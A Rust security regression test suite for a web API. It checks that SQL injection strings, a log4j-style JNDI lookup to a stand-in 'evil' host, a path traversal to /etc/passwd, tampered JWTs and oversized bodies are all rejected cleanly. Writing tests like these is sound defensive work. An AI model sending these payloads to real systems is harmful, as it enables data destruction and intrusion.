//! Security regression suite (Phase 11 pen-test pass — docs/HARDENING.md).
//!
//! Automated attack-surface checks that complement the functional suites:
//! injection payloads against every dynamic surface (URL path segments, list
//! filters, record bodies, publish-time identifiers), JWT tampering, malformed
//! input handling, and the global body limit. The invariant throughout: an
//! attack payload may earn a 4xx — never a 5xx, a panic, or data it should
//! not see.

use axum::body::Body;
use axum::http::{Request, StatusCode};
use http_body_util::BodyExt;
use mda_api::AppState;
use mda_meta::MetadataCache;
use mda_security::jwt::JwtConfig;
use serde_json::{json, Value};
use std::sync::Arc;
use tower::ServiceExt;
use uuid::Uuid;

mod common;

struct Ctx {
    app: axum::Router,
    token: String,
}

fn customer_model(table: &str) -> Value {
    customer_model_field(table, "name")
}

fn customer_model_field(table: &str, field: &str) -> Value {
    json!({
        "modules": [],
        "entities": [{
            "id": Uuid::new_v4(), "module_id": null, "name": "Customer",
            "table_name": table, "label": "Customer", "description": null,
            "fields": [
                {"id": Uuid::new_v4(), "name": field, "label":"Name","field_type":"string","required":true,"is_unique":false,"is_indexed":false,"default_expr":null,"config":{}}
            ],
            "relationships": []
        }]
    })
}

async fn setup() -> Option<Ctx> {
    let url = std::env::var("DATABASE_URL").ok()?;
    let (pool, _db) = common::spawn_db(&url).await;
    let tenant = Uuid::nil();
    let role_id = common::seed_role(&pool, tenant, "admin", &[("*", "*")]).await;
    let hash = mda_security::hash_password("x").unwrap();
    let email = format!("sec{}@test", Uuid::new_v4().simple());
    let user_id = common::seed_user(&pool, tenant, &email, "admin", &hash).await;
    common::seed_assignment(&pool, tenant, user_id, role_id).await;
    let jwt = JwtConfig::from_env();
    let token = jwt.issue_access(user_id, tenant, None).unwrap();
    let blobs: Arc<dyn mda_api::blobs::BlobStore> =
        Arc::new(mda_api::blobs::LocalBlobStore::from_env());
    let secrets: Arc<dyn mda_core::SecretStore> =
        Arc::new(mda_api::secrets::LocalSecretStore::from_env());
    let app = mda_api::router(AppState {
        pool,
        cache: MetadataCache::new(),
        jwt,
        blobs,
        secrets,
        events: mda_api::events::channel(),
        login_throttle: mda_security::LoginThrottle::default(),
        gql: Arc::new(tokio::sync::RwLock::new(std::collections::HashMap::new())),
    });
    Some(Ctx { app, token })
}

async fn call(app: &axum::Router, method: &str, uri: &str, token: &str) -> (StatusCode, Value) {
    call_body(app, method, uri, token, None).await
}

async fn call_body(
    app: &axum::Router,
    method: &str,
    uri: &str,
    token: &str,
    body: Option<String>,
) -> (StatusCode, Value) {
    let mut b = Request::builder().method(method).uri(uri);
    b = b.header(axum::http::header::AUTHORIZATION, format!("Bearer {token}"));
    let req = if let Some(body) = body {
        b.header("content-type", "application/json")
            .body(Body::from(body))
            .unwrap()
    } else {
        b.body(Body::empty()).unwrap()
    };
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let val: Value = if bytes.is_empty() {
        Value::Null
    } else {
        serde_json::from_slice(&bytes).unwrap_or(Value::Null)
    };
    (status, val)
}

async fn setup_with_customer() -> Option<Ctx> {
    let ctx = setup().await?;
    // publish a Customer entity through the Studio flow
    let (_, d) = call_body(
        &ctx.app,
        "POST",
        "/api/studio/drafts",
        &ctx.token,
        Some(json!({"name":"sec"}).to_string()),
    )
    .await;
    let id = d["id"].as_str()?.parse::<Uuid>().unwrap();
    let etag = d["version_etag"].as_str()?.to_string();
    let req = Request::builder()
        .method("PUT")
        .uri(format!("/api/studio/drafts/{id}/model"))
        .header(
            axum::http::header::AUTHORIZATION,
            format!("Bearer {}", ctx.token),
        )
        .header("if-match", etag)
        .header("content-type", "application/json")
        .body(Body::from(customer_model("customer").to_string()))
        .unwrap();
    let _ = ctx.app.clone().oneshot(req).await.unwrap();
    let (st, _) = call_body(
        &ctx.app,
        "POST",
        &format!("/api/studio/drafts/{id}/publish"),
        &ctx.token,
        None,
    )
    .await;
    assert_eq!(st, StatusCode::OK);
    // seed one record so filters have data to (not) leak
    let (st, _) = call_body(
        &ctx.app,
        "POST",
        "/api/data/Customer",
        &ctx.token,
        Some(json!({"name":"Acme"}).to_string()),
    )
    .await;
    assert_eq!(st, StatusCode::CREATED);
    Some(ctx)
}

/// Classic and modern SQL-injection payloads against the dynamic read surface.
/// Bound parameters + the publish-time identifier gate mean these can only
/// ever be *values* — assertions: no 5xx, and the filter never widens results.
#[tokio::test]
async fn sql_injection_payloads_in_filters_and_paths() {
    let Some(ctx) = setup_with_customer().await else {
        return;
    };

    let payloads = [
        "' OR '1'='1",
        "'; DROP TABLE sys_event_log; --",
        "Acme' UNION SELECT 1 --",
        "1; DELETE FROM biz.customer WHERE 1=1",
        "Acme\"; INSERT INTO sec.sec_user VALUES ('x') --",
        "${jndi:ldap://evil}", // log4j-style, for the log path
        "../../etc/passwd",
        "%27%20OR%20%271%27%3D%271",
    ];
    for p in payloads {
        let uri = format!("/api/data/Customer?filter=name:eq:{}", urlenc(p));
        let (st, v) = call(&ctx.app, "GET", &uri, &ctx.token).await;
        assert!(
            st.is_success() || st == StatusCode::UNPROCESSABLE_ENTITY,
            "payload {p:?} → {st} (must be 2xx/422)"
        );
        if st.is_success() {
            let total = v["total"].as_u64().unwrap_or(0);
            assert_eq!(total, 0, "payload {p:?} must not widen results");
        }
    }

    // Injection in the ENTITY path segment → unknown entity (404), never 500.
    for p in [
        "Customer%27%20OR%201=1",
        "Customer;DROP%20TABLE%20biz.customer",
        "customer--",
    ] {
        let (st, _) = call(&ctx.app, "GET", &format!("/api/data/{p}"), &ctx.token).await;
        assert_eq!(st, StatusCode::NOT_FOUND, "path payload {p:?} → {st}");
    }

    // Injection as a FIELD NAME in the body → unknown field (422), never 500.
    let (st, v) = call_body(
        &ctx.app,
        "POST",
        "/api/data/Customer",
        &ctx.token,
        Some(json!({"name'; DROP TABLE biz.customer; --": "x"}).to_string()),
    )
    .await;
    assert_eq!(st, StatusCode::UNPROCESSABLE_ENTITY, "{v}");
}

fn urlenc(s: &str) -> String {
    // minimal percent-encoding for the query string
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Malicious identifiers at publish time are rejected by the identifier gate
/// (PLAN §5.16 — metadata is untrusted). The draft PUT accepts raw content;
/// the gate runs at validate/publish time, so those must refuse it.
#[tokio::test]
async fn malicious_identifiers_rejected_at_publish() {
    let Some(ctx) = setup().await else {
        return;
    };
    for bad in [
        "customer; DROP TABLE meta.md_entity",
        "customer--",
        "Customer", // uppercase → not [a-z][a-z0-9_]*
        "customer name",
        // field names: SQL keywords / reserved core columns / injection
        "select",
        "id",
        "tenant_id",
        "name; DROP TABLE biz.customer; --",
    ] {
        let (_, d) = call_body(
            &ctx.app,
            "POST",
            "/api/studio/drafts",
            &ctx.token,
            Some(json!({"name":"s"}).to_string()),
        )
        .await;
        let id = d["id"].as_str().unwrap().parse::<Uuid>().unwrap();
        let etag = d["version_etag"].as_str().unwrap();
        let req = Request::builder()
            .method("PUT")
            .uri(format!("/api/studio/drafts/{id}/model"))
            .header(
                axum::http::header::AUTHORIZATION,
                format!("Bearer {}", ctx.token),
            )
            .header("if-match", etag)
            .header("content-type", "application/json")
            .body(Body::from(
                customer_model_field("customer", bad).to_string(),
            ))
            .unwrap();
        let resp = ctx.app.clone().oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success() || resp.status().is_client_error(),
            "PUT with identifier {bad:?} → {}",
            resp.status()
        );
        // validate must flag it…
        let (st, v) = call(
            &ctx.app,
            "POST",
            &format!("/api/studio/drafts/{id}/validate"),
            &ctx.token,
        )
        .await;
        assert_eq!(st, StatusCode::OK, "{v}");
        assert!(
            !v["valid"].as_bool().unwrap_or(true),
            "identifier {bad:?} must fail validation: {v}"
        );
        // …and publish must refuse it.
        let (st, v) = call(
            &ctx.app,
            "POST",
            &format!("/api/studio/drafts/{id}/publish"),
            &ctx.token,
        )
        .await;
        assert!(
            st.is_client_error(),
            "publish with identifier {bad:?} must be refused, got {st}: {v}"
        );
    }
}

/// Tampered / forged tokens never authenticate.
#[tokio::test]
async fn tampered_jwt_rejected() {
    let Some(ctx) = setup_with_customer().await else {
        return;
    };
    // garbage
    let (st, _) = call(&ctx.app, "GET", "/api/data/Customer", "not.a.token").await;
    assert_eq!(st, StatusCode::UNAUTHORIZED);
    // valid token with a flipped signature character
    let mut tok = ctx.token.clone();
    let last = tok.pop().unwrap();
    tok.push(if last == 'A' { 'B' } else { 'A' });
    let (st, _) = call(&ctx.app, "GET", "/api/data/Customer", &tok).await;
    assert_eq!(st, StatusCode::UNAUTHORIZED);
    // empty
    let (st, _) = call(&ctx.app, "GET", "/api/data/Customer", "").await;
    assert_eq!(st, StatusCode::UNAUTHORIZED);
}

/// Malformed input is a client error, and every error body is JSON with the
/// platform envelope (never reflected HTML → no XSS surface).
#[tokio::test]
async fn malformed_input_and_error_content_type() {
    let Some(ctx) = setup_with_customer().await else {
        return;
    };
    let req = Request::builder()
        .method("POST")
        .uri("/api/data/Customer")
        .header(
            axum::http::header::AUTHORIZATION,
            format!("Bearer {}", ctx.token),
        )
        .header("content-type", "application/json")
        .body(Body::from("{not json"))
        .unwrap();
    let resp = ctx.app.clone().oneshot(req).await.unwrap();
    assert!(resp.status().is_client_error(), "malformed json → 4xx");
    assert_eq!(
        resp.headers()["content-type"],
        "application/json",
        "errors must be JSON"
    );

    // 404 keeps the envelope too
    let resp = ctx
        .app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/data/NoSuchEntity")
                .header(
                    axum::http::header::AUTHORIZATION,
                    format!("Bearer {}", ctx.token),
                )
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::NOT_FOUND);
    assert_eq!(resp.headers()["content-type"], "application/json");
}

/// The global body limit (DefaultBodyLimit) caps every route — oversized
/// requests are rejected before handlers run.
#[tokio::test]
async fn oversized_body_rejected() {
    let url = std::env::var("DATABASE_URL").unwrap();
    let (pool, _db) = common::spawn_db(&url).await;
    let tenant = Uuid::nil();
    let role_id = common::seed_role(&pool, tenant, "admin", &[("*", "*")]).await;
    let hash = mda_security::hash_password("x").unwrap();
    let email = format!("big{}@test", Uuid::new_v4().simple());
    let user_id = common::seed_user(&pool, tenant, &email, "admin", &hash).await;
    common::seed_assignment(&pool, tenant, user_id, role_id).await;
    let jwt = JwtConfig::from_env();
    let token = jwt.issue_access(user_id, tenant, None).unwrap();
    let state = AppState {
        pool,
        cache: MetadataCache::new(),
        jwt,
        blobs: Arc::new(mda_api::blobs::LocalBlobStore::from_env()),
        secrets: Arc::new(mda_api::secrets::LocalSecretStore::from_env()),
        events: mda_api::events::channel(),
        login_throttle: mda_security::LoginThrottle::default(),
        gql: Arc::new(tokio::sync::RwLock::new(std::collections::HashMap::new())),
    };
    let cfg = mda_api::edge::EdgeConfig {
        max_body_bytes: 64,
        ..Default::default()
    };
    let app = mda_api::router_with(state, cfg);
    let big = "x".repeat(10_000);
    let resp = app
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/auth/login")
                .header("content-type", "application/json")
                .body(Body::from(format!("{{\"padding\":\"{big}\"}}")))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::PAYLOAD_TOO_LARGE);
    let _ = token;
}
